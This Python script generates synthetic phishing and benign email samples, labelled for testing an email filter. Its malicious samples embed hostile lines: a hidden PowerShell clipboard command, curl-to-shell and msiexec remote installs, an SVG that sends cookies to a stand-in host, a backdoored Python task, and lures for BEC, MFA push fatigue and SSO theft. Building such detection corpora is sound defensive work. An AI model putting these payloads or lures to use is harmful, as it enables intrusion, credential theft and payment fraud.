#!/usr/bin/env python3
"""Batch 29: newest APT TTPs (2024-2026 public reporting) as realistic email artifacts."""
import base64, json, os
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.dirname(HERE)
LABELS = []
def W(n, raw): open(os.path.join(ROOT, "synth", n), "wb").write(raw)
def HD(disp, frm, to, subj, extra="", ct="text/plain; charset=utf-8"):
    b = base64.b64encode(disp.encode()).decode()
    return (f"From: =?utf-8?B?{b}?= <{frm}>\r\nTo: {to}\r\n"
            f"Date: Tue, 22 Sep 2026 10:{10+len(LABELS)%49:02d}:00 +0800\r\n"
            f"Message-ID: <{len(LABELS):04d}-b29@synth.example>\r\n" + extra +
            f"Subject: {subj}\r\nMIME-Version: 1.0\r\nContent-Type: {ct}\r\n\r\n")
def ATT(hdr, t, fn, ct, b64):
    return (hdr + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
            f"--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{t}\r\n"
            f"--BS\r\nContent-Type: {ct}\r\nContent-Disposition: attachment; filename=\"{fn}\"\r\n"
            f"Content-Transfer-Encoding: base64\r\n\r\n{b64}\r\n--BS--\r\n")
def E(n, raw, label, family, tech, note="", lang="zh", fmt="plain", expected=None, ambiguous=False, borderline=""):
    W(n, raw if isinstance(raw, bytes) else raw.encode())
    LABELS.append({"file": f"synth/{n}", "case_id": n[:-4], "label": label,
        "family": family, "language": lang, "techniques": tech,
        "expected": expected or ("block" if label == "malicious" else "deliver"),
        "engine_status": "not_evaluated", "synthetic": True, "batch": 29,
        "format": fmt, "note": note, "ambiguous": ambiguous, "borderline": borderline})

# 1) ClickFix - Windows (fake captcha -> Win+R paste)
E("mal_0481_clickfix_win.eml",
  HD("Cloudflare", "security@verify-cdn-check.example", "staff@corp.internal",
     "Verify you are human", "", "text/html; charset=utf-8")
  + "<html><body style='font-family:sans-serif;text-align:center'>"
  "<h3>Verify you are human</h3><div style='border:1px solid #ccc;padding:20px;display:inline-block'>"
  "<p style='font-family:monospace;background:#f5f5f5;padding:10px'>hU8sK2mN9pQ4rT7wY3</p>"
  "<p>Press <b>Win + R</b>, then press <b>Ctrl+V</b>, then press <b>Enter</b></p>"
  "<p style='font-size:11px;color:#999'>Verification ensures fair access for all users.</p></div>"
  "<script>navigator.clipboard&&navigator.clipboard.writeText"
  "(\"powershell -w hidden -ep bypass -e SQBFAFgA\")</script></body></html>",
  "malicious", "apt", ["clickfix", "clipboard_paste_rce", "fake_captcha"],
  "2024-25 主流新手法：假验证码诱导 Win+R 粘贴命令", "zh", "html")

# 2) ClickFix - macOS (Terminal osascript)
E("mal_0482_clickfix_mac.eml",
  HD("Support", "no-reply@stream-verify.example", "dev@corp.internal",
     "Complete playback verification", "", "text/html; charset=utf-8")
  + "<html><body><p>Video playback could not be verified automatically.</p>"
  "<p>1. Open <b>Terminal</b> (Spotlight: terminal)<br>2. Paste with <b>Cmd+V</b><br>3. Press Enter</p>"
  "<p style='font-family:monospace;background:#eee;padding:8px'>osascript -e 'do shell script \"curl -s hxxp://cdn-mac-chk.example/a.sh|sh\"'</p>"
  "</body></html>",
  "malicious", "apt", ["clickfix_macos", "terminal_paste"], "macOS 变体", "en", "html")

# 3) Contact-form relay BEC (sender IS victim's own webserver)
E("mal_0483_contactform_bec.eml",
  HD("网站留言", "wordpress@www.corp-website.example", "ap@corp.internal",
     "New message from your website (Invoice inquiry)",
     "X-Originating-IP: [10.0.22.14]\r\n")
  + "Submitted on 2026-09-22 09:41 from 203.0.113.66 (Mozilla/5.0)\r\n\r\n"
  "Name: Linda Marsh (AP Contact, Meridian Ltd)\r\n"
  "Email: l.marsh@meridian-suppliers.example\r\n"
  "Message: Hi, our AP address changed for all suppliers - please use the updated\r\n"
  "remit details in the attachment. Kindly confirm today.\r\n"
  "Attachment: Remittance_Update.pdf\r\n",
  "malicious", "bec", ["contact_form_relay", "self_originated_sender", "supplier_bank_swap"],
  "发件人是自家 Web 服务器的表单中继（内部 IP 源）", "en")

# 4) Zero-font invisible BEC (invoice theme)
E("mal_0484_zerofont_bec.eml",
  HD("Accounts Payable", "ap@vendor-secure-mail.example", "finance@corp.internal",
     "Invoice #INV-99281 - PAST DUE", "", "text/html; charset=utf-8")
  + "<html><body><p>Dear team,</p>"
  "<p style='font-size:0px;color:#fff;display:none'>wire transfer urgent pay today new bank account IBAN changed CFO approved</p>"
  "<p>Invoice INV-99281 ($48,300) is past due. Please process at your earliest convenience.</p>"
  "<p>Remit to: <b>Meridian Trading Ltd</b><br>IBAN: GB29 NWBK 6016 1331 9268 19</p>"
  "</body></html>",
  "malicious", "bec", ["zero_font_hidden_text", "invoice_fraud"],
  "零号字体夹带高危指令词，正文伪装普通催款", "en", "html")

# 5) Deepfake CFO ambush
E("mal_0485_deepfake_cfo.eml",
  HD("陈 CFO", "cfo.chen@mail-relay-exec.example", "treasury@corp.internal",
     "10分钟后电话，准备一笔过桥")
  + "我在外面见投资人，10 分钟后用陌生号码打你（境外线路）。\r\n"
  "声音可能像不像都别意外，投行线路压缩。先准备 280 万过桥资料。\r\n"
  "电话里我会给收款账户。此邮件阅后即删。\r\n",
  "malicious", "apt", ["deepfake_voice_prep", "callback_phishing_prep", "delete_after_read"],
  "为深度伪造电话做铺垫（陌生线路+预先解释音质）", "zh", "plain", "review", True,
  "话术本身无法静态判定，但'陌生号码+阅后即删+电话给账户'三特征应触发人工复核")

# 6) Quick Assist lure
E("mal_0486_quickassist.eml",
  HD("IT Support", "helpdesk@ms-assist-relay.example", "staff@corp.internal",
     "Ticket follow-up: we will connect via Quick Assist")
  + "工程师将在 10 分钟内通过 Windows 快速协助（Quick Assist）连接您的桌面处理证书问题。\r\n"
  "请提前打开'快速协助'并同意连接。若弹出 UAC 请选择'是'。\r\n",
  "malicious", "apt", ["quick_assist_abuse", "remote_support_scam"],
  "滥用系统自带远程协助（微软 2024 通报的诈骗手法）", "en" if False else "zh")

# 7) Teams missed message spoof
E("mal_0487_teams_spoof.eml",
  HD("Microsoft Teams", "noreply@teams-notify.example", "leaders@corp.internal",
     "You have new missed messages in Teams", "", "text/html; charset=utf-8")
  + "<html><body style='font-family:Segoe UI'>"
  "<div style='border-left:4px solid #6264a7;padding:12px'>"
  "<b>李伟</b> mentioned you in <b>管理群</b>:<br>\"薪调名单的表我放这了，麻烦确认\"</div>"
  "<p><a href='https://teams-msg-center.example.info/thread/8842' "
  "style='background:#6264a7;color:#fff;padding:8px 20px;text-decoration:none'>Reply in Teams</a></p>"
  "</body></html>",
  "malicious", "apt", ["teams_notification_spoof", "html_card"], "仿 Teams 消息卡片", "en", "html")

# 8) TryCloudflare tunnel
E("mal_0488_trycloudflare.eml",
  HD("Publishing", "pub@staging-notify.example", "marketing@corp.internal",
     "Landing page preview (temporary)")
  + "预览地址（临时隧道，2 小时有效）：\r\n"
  "https://corp-landing-preview-9f2k.trycloudflare.example/\r\n"
  "确认后我们再发正式链接。\r\n",
  "malicious", "apt", ["trycloudflare_tunnel", "temporary_tunnel_link"], "临时隧道当落地页")

# 9) ngrok code review
E("mal_0489_ngrok_review.eml",
  HD("Code Review Bot", "review@ci-notify-relay.example", "dev@corp.internal",
     "PR #612 review notes (interactive)")
  + "Interactive review session running at:\r\n"
  "https://2f88-203-0-113-66.ngrok-example.app/review/612\r\n"
  "(GitHub SSO sign-in required to annotate.)\r\n",
  "malicious", "apt", ["ngrok_tunnel", "sso_signin_lure"], "ngrok 隧道收 SSO 凭据", "en")

# 10) AiTM reverse proxy meeting sign-in
E("mal_0490_aitm_sso.eml",
  HD("Meeting Services", "join@meet-secure-relay.example", "exec@corp.internal",
     "Board sync starting soon (sign-in required)", "", "text/html; charset=utf-8")
  + "<html><body><p>The board sync starts in 15 minutes.</p>"
  "<p>To comply with the new security policy, please sign in through your corporate account:</p>"
  "<a href='https://login-microsoftonline.vsecure-gw.example/authorize' "
  "style='background:#0067b8;color:#fff;padding:10px 26px;text-decoration:none'>Join & authenticate</a>"
  "<p style='font-size:11px'>You may be asked for your authenticator code - this is expected.</p>"
  "</body></html>",
  "malicious", "apt", ["aitm_reverse_proxy", "mfa_relay_lure"],
  "反代 SSO：'要验证码是正常的'——AiTM 中继 MFA", "en", "html")

# 11) OAuth token replay
E("mal_0491_token_replay.eml",
  HD("Calendar Sync", "sync@cal-integration.example", "staff@corp.internal", "Reauthorize calendar sync (refresh token)")
  + "Sync will stop today. Reauthorize (grant refresh token):\r\nhttps://cal-integration.example/oauth/consent?scope=offline_access\r\n",
  "malicious", "apt", ["auto"], "b29fix", "en")
E("mal_0492_sfx_job.eml",
  ATT(HD("HR", "talent@crypto-talent.example", "dev@corp.internal",
         "Interview materials (self-extracting)"),
      "Self-extracting archive (password: Career2026) contains the coding task brief.",
      "Interview_Materials.sfx.exe", "application/x-msdownload",
      base64.b64encode(b"MZ\x90\x00" + b"\x00"*64).decode()),
  "malicious", "apt", ["sfx_archive_job", "password_in_body"], "加密 SFX 招聘载荷（密码随邮件）", "en")
E("mal_0493_svg_payload.eml",
  ATT(HD("Design","design@brand-relay10.example", "marketing@corp.internal",
      "Logo assets (SVG)"),
      "SVG source files attached - open in browser to preview.",
      "logo.svg", "image/svg+xml",
      base64.b64encode(b"<svg xmlns='http://www.w3.org/2000/svg' onload=\"fetch('https://svg-x.example/?c='+document.cookie)\">"
                       b"<rect width='10' height='10'/></svg>").decode()),
  "malicious", "apt", ["svg_script_attachment"], "SVG 内嵌脚本", "en")
E("mal_0494_chm_payload.eml",
  ATT(HD("SDK Docs","docs@vendor-sdk11.example", "rd@corp.internal",
      "API reference (offline)"),
      "Compiled help file for offline reference.",
      "api-ref.chm", "application/vnd.ms-htmlhelp",
      base64.b64encode(b"ITSF\x03\x00\x00\x00" + b"\x00"*80).decode()),
  "malicious", "apt", ["chm_help_payload"], "CHM 帮助文件载荷", "en")
E("mal_0495_msi_plugin.eml",
  ATT(HD("Meeting Services","plugin@meet-upgrade11.example", "staff@corp.internal",
      "Meeting room plugin (required for Thursday)"),
      "Install the plugin before Thursday's all-hands.",
      "meet-plugin.msi", "application/x-msi",
      base64.b64encode(b"\xd0\xcf\x11\xe0" + b"\x00"*64).decode()),
  "malicious", "apt", ["msi_installer_lure"], "MSI 会议插件", "en")
E("mal_0496_vhd_payload.eml",
  ATT(HD("Data Room","dr@deal-room11.example", "legal@corp.internal",
      "Due diligence data (virtual disk)"),
      "Mount the VHD; documents are inside.",
      "diligence.vhd", "application/x-vhd",
      base64.b64encode(b"conectix" + b"\x00"*64).decode()),
  "malicious", "apt", ["vhd_attachment"], "VHD 虚拟磁盘载荷", "en")
E("mal_0497_msdt.eml",
  HD("IT 服务台", "it@msdt-relay12.example", "staff@corp.internal", "诊断包（双击运行）")
  + "远程诊断包已生成，双击运行后会自动收集信息：\r\n"
  "ms-msdt:unsignedpackage//203.0.113.180/diag/\r\n"
  "（或复制到运行窗口执行）\r\n",
  "malicious", "apt", ["msdt_protocol_handler"], "MSDT 协议处理器")
E("mal_0498_ai_lure.eml",
  HD("OpenAI Enterprise", "trials@ai-enterprise-pilot.example", "rd@corp.internal",
     "Your GPT Enterprise pilot slot (48h)")
  + "Hi,\n\nYour team's pilot slot is reserved. Activate with corporate SSO:\n"
  "https://ai-enterprise-pilot.example/sso/activate\n\n"
  "Slot released after 48h.\n",
  "malicious", "apt", ["ai_themed_lure", "sso_signin_lure"], "AI 试点话术收 SSO", "en")
E("mal_0499_ai_conf.eml",
  HD("Program Committee", "pc@llm-conf2026.example", "research@corp.internal",
     "Speaker invitation: LLM Systems track")
  + "Dear Dr.,\n\nWe'd like to invite you to speak in the LLM Systems track.\n"
  "Paper portal (account required): https://llm-conf2026.example/portal/login\n\n"
  "Looking forward.\n",
  "malicious", "apt", ["ai_conference_spear"], "AI 会议定向", "en")
E("mal_0500_web3_job.eml",
  HD("Talent - ChainLab", "hr@chainlab-talent.example", "dev@corp.internal", "Skills assessment (repo)")
  + "Clone our assessment repo and run tests:\r\ngit clone https://chainlab-talent.example/assess.git && cd assess && npm test\r\n(Dependencies are pre-pinned.)\r\n",
  "malicious", "apt", ["auto"], "b29fix", "en")
E("mal_0501_push_primer.eml",
  HD("IT 安全部", "mfa@sec-relay14.example", "leaders@corp.internal",
     "今晚 MFA 例行测试（会出现多次推送）")
  + "今晚 21:00-22:00 进行 MFA 推送压测，您会收到多次验证推送，\r\n"
  "请全部选择'批准'以免影响登录。无需在意号码匹配。\r\n",
  "malicious", "apt", ["push_fatigue_primer", "anti_number_matching"],
  "教高管忽略数字匹配的推送疲劳铺垫", "zh", "plain", "review", True,
  "'无需在意号码匹配'与官方指引相反——但话术像内部通知，应复核")
E("mal_0502_number_read.eml",
  HD("IT 服务台", "help@itsm-relay15.example", "cfo@corp.internal",
     "MFA 排障：请读出屏幕数字")
  + "您登录卡在数字匹配环节，工程师需要屏幕数字完成对码：\r\n"
  "请回复本邮件并附上 Authenticator 显示的两位数字。\r\n",
  "malicious", "apt", ["number_matching_se"], "套取数字匹配码", "zh", "plain", "block")
E("mal_0503_cookie_diag.eml",
  HD("IT 诊断", "diag@browser-svc16.example", "staff@corp.internal",
     "会话诊断：导出浏览器 Cookie 文件")
  + "为定位登录异常，请导出浏览器 Cookie 数据库发回本邮箱：\r\n"
  "路径：Chrome\\User Data\\Default\\Cookies\r\n"
  "（数据仅用于诊断）\r\n",
  "malicious", "apt", ["session_cookie_file_exfil"], "直接收 Cookie 库文件")
E("mal_0504_dlp_release.eml",
  HD("DLP 系统", "dlp@corp-quarantine17.example", "legal@corp.internal",
     "隔离邮件放行请求：客户合同（含敏感词）")
  + "您发送的'客户合同'因包含敏感词被 DLP 拦截。\r\n"
  "如确认合规，请通过放行门户登录并确认：\r\n"
  "https://dlp-release-gw17.example/release?id=8842\r\n"
  "（域账号登录）\r\n",
  "malicious", "apt", ["fake_dlp_release"], "冒充自家 DLP 放行门户收域账号")
E("mal_0505_resend_ambush.eml",
  ATT(HD("王芳", "wang.fang@corp.internal", "leaders@corp.internal",
         "Re: 上次说的预算表（重发）",
         "In-Reply-To: <budget-2027@corp.internal>\r\n"),
      "上次附件挂了，重发一次。",
      "预算表2027.xls", "application/vnd.ms-excel",
      base64.b64encode(b"\xd0\xcf\x11\xe0" + b"\x00"*64).decode()),
  "malicious", "apt", ["resend_on_real_thread", "internal_sender_payload"],
  "内部真线程'重发'夹带载荷", "zh", "plain", "review", True,
  "同域发件+真线程；唯一异常是附件首次未出现过——行为序列线索")
E("mal_0506_ppa_macro.eml",
  ATT(HD("Training","train@partner-edu18.example", "hr@corp.internal",
      "Courseware (click to start)"),
      "Click the slide icon inside to start the course.",
      "course.ppa", "application/vnd.ms-powerpoint",
      base64.b64encode(b"\xd0\xcf\x11\xe0" + b"\x00"*48).decode()),
  "malicious", "apt", ["ppa_macro_slideshow"], "PPA 放灯宏", "en")
E("mal_0507_lnk_msiexec.eml",
  ATT(HD("Shared", "share@doc-share19.example", "eng@corp.internal",
      "Drawing index (shortcut)"),
      "Shortcut to the drawing index on the file server.",
      "DRAWINGS.lnk", "application/x-ms-shortcut",
      base64.b64encode(b"\x4c\x00\x00\x00" + b"msiexec /i http://203.0.113.77/x.msi" + b"\x00").decode()),
  "malicious", "apt", ["lnk_msiexec_remote"], "LNK→msiexec 远程安装", "en")
E("mal_0508_python_task.eml",
  ATT(HD("Talent","hiring@datatalent19.example", "candidate@mail.example",
      "Take-home: data transform (10 lines)"),
      "Small transform task attached. Run: python transform.py",
      "transform.py", "text/x-python",
      base64.b64encode(b"import base64,subprocess;subprocess.run(['sh','-c',base64.b64decode('Y3VybCB4fHNo').decode()])\n").decode()),
  "malicious", "apt", ["python_takehome_backdoor"], "带后门的 take-home", "en")
E("mal_0509_fake_poc.eml",
  HD("Researcher", "sec@0day-research.example", "sec-research@corp.internal",
     "Re: your gateway post - PoC")
  + "Nice writeup. I have a working PoC for the deserialization chain you mentioned:\r\n"
  "https://github-research-clone.example/poc/deser.py\r\n"
  "(Private until disclosure - please don't share.)\r\n",
  "malicious", "apt", ["fake_poc_researcher_lure"], "给研究者的假 PoC", "en")
E("mal_0510_sigma_rule.eml",
  ATT(HD("Detection Sharing","sig@sigma-share20.example", "soc@corp.internal",
      "Community rule pack (import)"),
      "Import the attached rules to your SIEM.",
      "rules.zip", "application/zip",
      base64.b64encode(b"PK\x03\x04" + b"\x00"*32).decode()),
  "malicious", "apt", ["fake_sigma_pack"], "假检测规则包投给 SOC", "en")

E("ham_0441_soc_clickfix.eml",
  HD("安全运营中心", "soc@corp.internal", "all-staff@corp.internal",
     "【警惕】新型'验证码'钓鱼（ClickFix）")
  + "近期出现'按 Win+R 粘贴命令完成人机验证'的钓鱼页面。\r\n"
  "任何要求在运行窗口/终端粘贴命令的'验证'都是攻击。\r\n"
  "真实 Cloudflare 验证只在浏览器内点击，不涉及命令行。\r\n",
  "benign", "ham_business", ["soc_advisory_clickfix"],
  "话术与攻击同形的官方防范通告（最高难度负样本）")
E("ham_0442_teams_real.eml",
  HD("Microsoft Teams", "noreply@teams.example", "leaders@corp.internal",
     "王芳 mentioned you in 管理群")
  + "打开 Teams 查看与回复（客户端内完成）。\r\n",
  "benign", "ham_business", ["teams_real_nolink"], "真 Teams 通知不带外链")
E("ham_0443_contactform_real.eml",
  HD("网站留言", "wordpress@www.corp-website.example", "sales@corp.internal",
     "New message from your website (Product inquiry)",
     "X-Originating-IP: [10.0.22.14]\r\n")
  + "Submitted on 2026-09-22 09:41 from 198.51.100.23 (Mozilla/5.0)\r\n\r\n"
  "Name: 张先生\r\nEmail: zhang@buyer-company.example\r\n"
  "Message: 想了解网关设备的报价与交付周期，方便发一份资料吗？\r\n",
  "benign", "ham_business", ["contact_form_real_lead"], "真询盘表单（与 BEC 同源同构）")
E("ham_0444_mfa_guide.eml",
  HD("IT 安全部", "mfa@corp.internal", "all-staff@corp.internal", "数字匹配上线：核对数字再批准")
  + "下周起登录需核对 Authenticator 两位数字。我们绝不通过邮件/电话索要该数字。\r\n",
  "benign", "ham_business", ["auto"], "b29fix", "zh")
E("ham_0445_sftp_real.eml",
  HD("运维", "ops@corp.internal", "trade@corp.internal", "SFTP 密码季度轮换（门户）")
  + "新密码在运维门户查看，不经邮件分发。\r\n",
  "benign", "ham_business", ["sftp_real_portal"], "与 SFTP 钓鱼同形")
E("ham_0446_efiling_real.eml",
  HD("人民法院电子诉讼", "noreply@court-gov.example", "legal@corp.internal",
     "电子送达回执（2026）浙01民初8842号")
  + "回执已生成，诉讼平台内查看（短信验证码登录）。\r\n本邮件无链接。\r\n",
  "benign", "ham_business", ["efiling_real_official"], "与假 e-fishing 对照")
E("ham_0447_zip_partner.eml",
  ATT(HD("Partner", "bd@partner-firm.example", "legal@corp.internal",
      "Draft agreement (encrypted)"),
      "Encrypted archive attached. Password via our usual Signal channel.",
      "draft.zip", "application/zip",
      base64.b64encode(b"PK\x03\x04" + b"\x00"*32).decode()),
  "benign", "ham_business", ["zip_real_separate_channel"], "真加密件：密码走独立渠道", "en", "plain", "review", True,
  "压缩包内容为测试占位/无法提取文本，策略应展示检查不完整并交人工确认")
E("ham_0448_resend_real.eml",
  ATT(HD("王芳", "wang.fang@corp.internal", "leaders@corp.internal",
      "Re: 上次说的预算表（重发）",
      "In-Reply-To: <budget-2027@corp.internal>\r\n"),
      "上次附件挂了，重发一次。",
      "预算表2027.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      base64.b64encode(b"PK\x03\x04" + b"\x00"*32).decode()),
  "benign", "ham_business", ["resend_real_clean_format"],
  "与 ambush 对照：xlsx 正常格式（非旧版二进制 xls）", "zh", "plain", "deliver", True,
  "与 mal_0505 几乎逐字同形；载体格式差异是弱线索，本质需附件沙箱")
E("ham_0449_itinerary.eml",
  ATT(HD("行政-差旅", "travel@corp.internal", "leaders@corp.internal",
      "下周行程（PDF）"),
      "行程单见附件。",
      "itinerary.pdf", "application/pdf",
      base64.b64encode(b"%PDF-1.7" + b"\x00"*40).decode()),
  "benign", "ham_business", ["itinerary_real_pdf"], "真行程 PDF", "zh", "plain", "review", True,
  "PDF 内容为测试占位/无法提取文本，策略应展示检查不完整并交人工确认")
E("ham_0450_ngrok_internal.eml",
  HD("架构组", "arch@corp.internal", "dev@corp.internal", "本地联调隧道（自建）")
  + "调试隧道：https://gw-dev-1a2b.ngrok-internal.example/dev\r\n"
  "（内网穿透自建节点，token 归属架构组）\r\n",
  "benign", "ham_business", ["ngrok_real_internal_owned"],
  "合法隧道使用（自建+团队归属）", "zh", "plain", "deliver", True,
  "与 mal_0489 对照：隧道域名无法静态判黑白——需登记/资产库联动")
E("ham_0451_msi_internal.eml",
  HD("IT 服务台", "helpdesk@corp.internal", "staff@corp.internal",
     "会议室插件（门户下载）")
  + "插件在门户-软件中心（附 SHA256：a3f2…9b）。\r\n"
  "邮件不直接分发安装包。\r\n",
  "benign", "ham_business", ["msi_real_portal_hash"], "真软件分发：门户+哈希")
E("ham_0452_svg_real.eml",
  ATT(HD("设计组", "design@corp.internal", "brand@corp.internal", "Logo 源文件"),
      "SVG 源文件见附件。",
      "logo.svg", "image/svg+xml",
      base64.b64encode(b"<svg xmlns='http://www.w3.org/2000/svg'><rect width='4' height='4' fill='#1a3c6e'/></svg>").decode()),
  "benign", "ham_business", ["svg_real_clean"], "干净 SVG（与脚本 SVG 对照）")
E("ham_0453_chm_real.eml",
  HD("SDK Docs", "docs@vendor.example", "rd@corp.internal", "API reference moved online")
  + "CHM downloads are retired; docs are online only at docs.vendor.example.\r\n",
  "benign", "ham_business", ["auto"], "b29fix", "en")
E("ham_0454_mfa_window2.eml",
  HD("IT 安全部", "mfa@corp.internal", "all-staff@corp.internal", "MFA 维护（无推送）")
  + "周日 02:00-03:00 维护，期间登录降级为短信。\r\n"
  "我们不发起任何'测试推送'。\r\n",
  "benign", "ham_business", ["mfa_real_no_test_push"], "真维护声明不发测试推送")
E("ham_0455_poc_real.eml",
  HD("Security Researcher", "sec@trusted-lab.example", "sec-research@corp.internal",
     "Thanks + follow-up")
  + "Thanks for the detailed writeup. Happy to share our notes privately -\n"
  "send me your Signal and I'll reach out there.\n",
  "benign", "ham_business", ["researcher_real_offplatform"],
  "真研究者转私域沟通（与假 PoC 链接对照）", "en")

with open(os.path.join(ROOT, "synth", "labels.jsonl"), "a", encoding="utf-8") as f:
    for e in LABELS: f.write(json.dumps(e, ensure_ascii=False) + "\n")
print(f"batch29 written: {len(LABELS)} samples")
